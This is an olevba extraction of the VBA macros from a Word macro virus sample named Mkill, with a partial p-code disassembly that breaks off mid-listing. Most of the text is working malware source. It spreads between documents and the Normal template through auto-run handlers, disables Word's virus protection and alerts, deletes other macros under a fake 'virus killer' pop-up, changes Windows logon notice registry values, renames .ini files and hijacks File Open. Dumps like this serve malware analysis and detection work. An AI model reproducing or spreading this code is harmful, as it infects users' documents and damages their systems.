olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mkill
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mkill - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim A1, A2, A3, A4 As Boolean
Dim A5, A6 As Object
Dim A7, A8, A16 As Integer
Dim A10, A11, A12, A13, A14 As String
Rem :-D you are marked!.it's just shit
Const A15 = "I Love Amon"
Private Sub Document_Open()
On Error Resume Next
jest
Set A5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set A6 = NormalTemplate.VBProject.VBComponents.Item(1)
A3 = A5.CodeModule.Find(A15, 1, 1, 100, 100)
A4 = A6.CodeModule.Find(A15, 1, 1, 100, 100)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If A4 = False Then
    A6.CodeModule.DeleteLines 1, A6.CodeModule.CountOfLines
End If
If A3 = False Then
        A5.CodeModule.DeleteLines 1, A5.CodeModule.CountOfLines
End If
End Sub
Private Sub Document_Close()
On Error Resume Next
jest
Set A5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set A6 = NormalTemplate.VBProject.VBComponents.Item(1)
A3 = A5.CodeModule.Find(A15, 1, 1, 100, 100)
A4 = A6.CodeModule.Find(A15, 1, 1, 100, 100)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If (A3 = True Xor A4 = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
      If A3 = True Then
        A2 = NormalTemplate.Saved
        A11 = A5.CodeModule.Lines(1, A5.CodeModule.CountOfLines)
        A6.CodeModule.DeleteLines 1, A6.CodeModule.CountOfLines
        A6.CodeModule.AddFromString A11
        With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "": .Category = "": .Keywords = "": .Comments = "": .Execute: End With
        If A2 = True Then NormalTemplate.Save
      End If
    If A4 = True Or ActiveDocument.Saved = False Then
     A1 = ActiveDocument.Saved
     A11 = A6.CodeModule.Lines(1, A6.CodeModule.CountOfLines)
     A5.CodeModule.DeleteLines 1, A5.CodeModule.CountOfLines
     A5.CodeModule.AddFromString A11
     With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "": .Category = "": .Keywords = "": .Comments = "": .Execute: End With
     If A1 = True Then ActiveDocument.Save
   End If
End If
End Sub
Private Sub Document_new()
On Error Resume Next
jest
Set A5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set A6 = NormalTemplate.VBProject.VBComponents.Item(1)
A3 = A5.CodeModule.Find(A15, 1, 1, 100, 100)
A4 = A6.CodeModule.Find(A15, 1, 1, 100, 100)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If A4 = False Then
    A6.CodeModule.DeleteLines 1, A6.CodeModule.CountOfLines
End If
If A3 = False Then
        A5.CodeModule.DeleteLines 1, A5.CodeModule.CountOfLines
End If
End Sub
Private Function jest()
Dim DelFlag As Boolean
Dim DocAmon, TempAmon, DocAmonL, TempAmonL As Boolean
Dim i, x As Integer
Dim MacroNames As String
On Error GoTo Getout
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocAmon = False
TempAmon = False
DocAmonL = False
TempAmonL = False
DelFlag = True
Do While (DelFlag)
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
MacroNames = ActiveDocument.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
DelFlag = True
Do While (DelFlag)
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
MacroNames = NormalTemplate.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(x).Name = "AmonClean" Then
       TempAmon = True
       If NormalTemplate.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
       TempAmonL = True
       End If
    End If
Next
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "AmonClean" Then
       DocAmon = True
        If ActiveDocument.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
        DocAmonL = True
        End If
    End If
Next
If DocAmonL = True Then
    DocAmon = False
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
If TempAmonL = True Then
    TempAmon = False
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
  If DocAmon = False And TempAmon = False Then
    Application.OrganizerCopy Source:=Options.DefaultFilePath(6) & "\MicroKiller.dot", _
    Destination:=NormalTemplate.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
     Application.OrganizerCopy Source:=Options.DefaultFilePath(6) & "\MicroKiller.dot", _
    Destination:=ActiveDocument.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
    DocAmon = True
    TempAmon = True
  End If
 If DocAmon = False Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
    Temo
     End If
 If TempAmon = False Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
   Temo
   End If
Getout:
 End Function
Private Function Temo()
Dim a, c As String
Dim b As Long
On Error GoTo Getout
c = Dir(Options.DefaultFilePath(6) & "\MicroKiller.dot")
If c = "" Then
a = ActiveDocument.FullName
b = ActiveDocument.SaveFormat
ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(6) & "\MicroKiller.dot", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
ActiveDocument.SaveAs FileName:=a, FileFormat:=b, AddToRecentFiles:=False
End If
Getout:
End Function
































-------------------------------------------------------------------------------
VBA MACRO AmonClean.bas 
in file: Virus.MSWord.Mkill - OLE stream: 'Macros/VBA/AmonClean'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function just()
Dim DelFlag As Boolean
Dim DocAmon, TempAmon, DocAmonL, TempAmonL As Boolean
Dim i, x As Integer
Dim MacroNames As String
On Error GoTo Getout
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocAmon = False
TempAmon = False
DocAmonL = False
TempAmonL = False
DelFlag = True
Do While (DelFlag)
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
MacroNames = ActiveDocument.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
DelFlag = True
Do While (DelFlag)
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
MacroNames = NormalTemplate.VBProject.VBComponents(i).Name
    If MacroNames <> "AmonClean" And MacroNames <> "ThisDocument" Then
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:=MacroNames, Object:=wdOrganizerObjectProjectItems
     DelFlag = True
     MsgBox "Find Micro [" & MacroNames & "] ,I shall kill it!" _
    , vbCritical, "Micro Virus Killer Ver. 1.2"
     Exit For
     Else
     DelFlag = False
    End If
Next
Loop
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(x).Name = "AmonClean" Then
       TempAmon = True
       If NormalTemplate.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
       TempAmonL = True
       End If
    End If
Next
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "AmonClean" Then
       DocAmon = True
        If ActiveDocument.VBProject.VBComponents(x).CodeModule.CountOfLines < 50 Then
        DocAmonL = True
        End If
    End If
Next
If DocAmonL = True Then
    DocAmon = False
     Application.OrganizerDelete Source:=ActiveDocument.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
If TempAmonL = True Then
    TempAmon = False
     Application.OrganizerDelete Source:=NormalTemplate.FullName, _
     Name:="AmonClean", Object:=wdOrganizerObjectProjectItems
    End If
 If DocAmon = False Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
   Temo
 End If
 If TempAmon = False Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, Name:="AmonClean", _
    Object:=wdOrganizerObjectProjectItems
Temo
 End If
Getout:
 End Function
Private Function Temo()
Dim a, c As String
Dim b As Long
On Error GoTo Getout
c = Dir(Options.DefaultFilePath(6) & "\MicroKiller.dot")
If c = "" Then
a = ActiveDocument.FullName
b = ActiveDocument.SaveFormat
ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(6) & "\MicroKiller.dot", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
ActiveDocument.SaveAs FileName:=a, FileFormat:=b, AddToRecentFiles:=False
End If
Getout:
End Function
 Function Acting()
 Dim ch, Aname, N, MyName As String
 On Error GoTo Getout
      ch = System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Amon")
ch = Val(ch) + 1
System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Amon") = ch
  If (Val(ch) > 1976 And System.Version = "4.10") Then
    System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\winlogon", "legalNoticecaption") = "I Believe Enough To Say That..."
    System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\winlogon", "legalNoticeText") = "I Love Amon"
  End If
  If Val(ch) > 2001 Or (Val(ch) > 1976 And System.Version <> "4.10") Then
      Aname = System.PrivateProfileString("", _
      "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "oldwindir")
      MyName = Dir(Aname + "\*.ini")
      Do While MyName <> ""
      N = Left(MyName, Len(MyName) - 3) + "lnl": Name Aname + "\" + MyName As Aname + "\" + N: MyName = Dir
      Loop
  End If
Getout:
End Function
Sub Doit()
On Error Resume Next
Dim x1, x2, x3, x4
Dim ctl
Dim zz As String
Dim z  As Integer
Set x1 = Application.CommandBars("Standard").Controls
  For z = 1 To x1.Count
    If x1.Item(z).ID = 23 Then
        x1.Item(z).Delete
        x1.Add Type:=msoControlButton, _
          ID:=1, Before:=2
        x1.Item(z).FaceId = 23
        x1.Item(z).OnAction = "NoNo"
    End If
  Next
Set x2 = CommandBars.ActiveMenuBar.Controls.Item(1)
Set x3 = x2.CommandBar.Controls
  For z = 1 To x3.Count
   If x3.Item(z).ID = 23 Then
    zz = x3.Item(z).Caption
    x3.Item(z).Delete
    x3.Add Type:=msoControlButton, _
          ID:=1, Before:=2
    x3.Item(z).FaceId = 23
    x3.Item(z).OnAction = "NoNo"
    x3.Item(z).Caption = zz
   End If
  Next
jojy:
End Sub
Sub NoNo()
Dim ach
ItOn
ach = Dialogs(wdDialogFileOpen).Show
If ach <> 0 Then
just
Acting
End If
ItOff
End Sub
Sub Fileopen()
NoNo
End Sub
Sub AutoOpen()
ItOn
Doit
just
Acting
ItOff
End Sub
Sub AutoClose()
ItOn
Doit
just
Acting
ItOff
End Sub
Sub AutoNew()
just
Doit
Acting
End Sub
Sub fileexit()
autoexit
End Sub
Sub autoexit()
Doit
ItOn
just
Acting
ItOff
End Sub
Sub autoexec()
Doit
just
Acting
ItOn
just
Acting
ItOff
End Sub
Function ItOn()
WordBasic.DisableAutoMacros True
End Function
Function ItOff()
WordBasic.DisableAutoMacros False
End Function
Sub ViewVBCode()
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mkill
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 16251 bytes
' Line #0:
' 	Dim 
' 	VarDefn A1
' 	VarDefn A2
' 	VarDefn A3
' 	VarDefn A4 (As Boolean)
' Line #1:
' 	Dim 
' 	VarDefn A5
' 	VarDefn A6 (As Object)
' Line #2:
' 	Dim 
' 	VarDefn A7
' 	VarDefn A8
' 	VarDefn A16 (As Integer)
' Line #3:
' 	Dim 
' 	VarDefn A10
' 	VarDefn A11
' 	VarDefn A12
' 	VarDefn A13
' 	VarDefn A14 (As String)
' Line #4:
' 	Rem 0x0023 " :-D you are marked!.it's just shit"
' Line #5:
' 	Dim (Const) 
' 	LitStr 0x000B "I Love Amon"
' 	VarDefn A15
' Line #6:
' 	FuncDefn (Private Sub Document_Open())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	ArgsCall jest 0x0000 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set A5 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set A6 
' Line #11:
' 	Ld A15 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld A5 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St A3 
' Line #12:
' 	Ld A15 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld A6 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St A4 
' Line #13:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #14:
' 	Ld A4 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld A6 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld A6 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld A3 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld A5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld A5 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Private Sub Document_Close())
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	ArgsCall jest 0x0000 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set A5 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set A6 
' Line #26:
' 	Ld A15 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld A5 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St A3 
' Line #27:
' 	Ld A15 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld A6 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St A4 
' Line #28:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #29:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld A3 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld A4 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #30:
' 	Ld A3 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #31:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St A2 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld A5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld A5 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St A11 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld A6 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld A6 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #34:
' 	Ld A11 
' 	Ld A6 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #35:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Subject 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Category 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Comments 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' Line #36:
' 	Ld A2 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld A4 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St A1 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld A6 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld A6 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St A11 
' Line #41:
' 	LitDI2 0x0001 
' 	Ld A5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld A5 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #42:
' 	Ld A11 
' 	Ld A5 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #43:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Subject 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Category 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	MemStWith Comments 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' Line #44:
' 	Ld A1 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Private Sub Document_new())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall jest 0x0000 
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set A5 
' Line #52:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set A6 
' Line #53:
' 	Ld A15 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld A5 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St A3 
' Line #54:
' 	Ld A15 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	Ld A6 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St A4 
' Line #55:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #56:
' 	Ld A4 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld A6 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld A6 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	Ld A3 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	LitDI2 0x0001 
' 	Ld A5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld A5 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Private Function jest(id_FFFE As Variant))
' Line #64:
' 	Dim 
' 	VarDefn DelFlag (As Boolean)
' Line #65:
' 	Dim 
' 	VarDefn DocAmon
' 	VarDefn TempAmon
' 	VarDefn DocAmonL
' 	VarDefn TempAmonL (As Boolean)
' Line #66:
' 	Dim 
' 	VarDefn i
' 	VarDefn x (As Integer)
' Line #67:
' 	Dim 
' 	VarDefn MacroNames (As String)
' Line #68:
' 	OnError Getout 
' Line #69:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #70:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #71:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #72:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #73:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #74:
' 	LitVarSpecial (False)
' 	St DocAmon 
' Line #75:
' 	LitVarSpecial (False)
' 	St TempAmon 
' Line #76:
' 	LitVarSpecial (False)
' 	St DocAmonL 
' Line #77:
' 	LitVarSpecial (False)
' 	St TempAmonL 
' Line #78:
' 	LitVarSpecial (True)
' 	St DelFlag 
' Line #79:
' 	Ld DelFlag 
' 	Paren 
' 	DoWhile 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #81:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St MacroNames 
' Line #82:
' 	Ld MacroNames 
' 	LitStr 0x0009 "AmonClean"
' 	Ne 
' 	Ld MacroNames 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #83:
' 	LineCont 0x0004 09 00 05 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld MacroNames 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #84:
' 	LitVarSpecial (True)
' 	St DelFlag 
' Line #85:
' 	LineCont 0x0004 06 00 04 00
' 	LitStr 0x000C "Find Micro ["
' 	Ld MacroNames 
' 	Concat 
' 	LitStr 0x0013 "] ,I shall kill it!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x001B "Micro Virus Killer Ver. 1.2"
' 	ArgsCall MsgBox 0x0003 
' Line #86:
' 	ExitFor 
' Line #87:
' 	ElseBlock 
' Line #88:
' 	LitVarSpecial (False)
' 	St DelFlag 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Next 
' Line #91:
' 	Loop 
' Line #92:
' 	LitVarSpecial (True)
' 	St DelFlag 
' Line #93:
' 	Ld DelFlag 
' 	Paren 
' 	DoWhile 
' Line #94:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #95:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St MacroNames 
' Line #96:
' 	Ld MacroNames 
' 	LitStr 0x0009 "AmonClean"
' 	Ne 
' 	Ld MacroNames 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #97:
' 	LineCont 0x0004 09 00 05 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld MacroNames 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #98:
' 	LitVarSpecial (True)
' 	St DelFlag 
' Line #99:
' 	LineCont 0x0004 06 00 04 00
' 	LitStr 0x000C "Find Micro ["
' 	Ld MacroNames 
' 	Concat 
' 	LitStr 0x0013 "] ,I shall kill it!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x001B "Micro Virus Killer Ver. 1.2"
' 	ArgsCall MsgBox 0x0003 
' Line #100:
' 	ExitFor 
' Line #101:
' 	ElseBlock 
' Line #102:
' 	LitVarSpecial (False)
' 	St DelFlag 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	StartForVariable 
' 	Next 
' Line #105:
' 	Loop 
' Line #106:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #107:
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "AmonClean"
' 	Eq 
' 	IfBlock 
' Line #108:
' 	LitVarSpecial (True)
' 	St TempAmon 
' Line #109:
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0032 
' 	Lt 
' 	IfBlock 
' Line #110:
' 	LitVarSpecial (True)
' 	St TempAmonL 
' Line #111:
' 	EndIfBlock 
' Line #112:
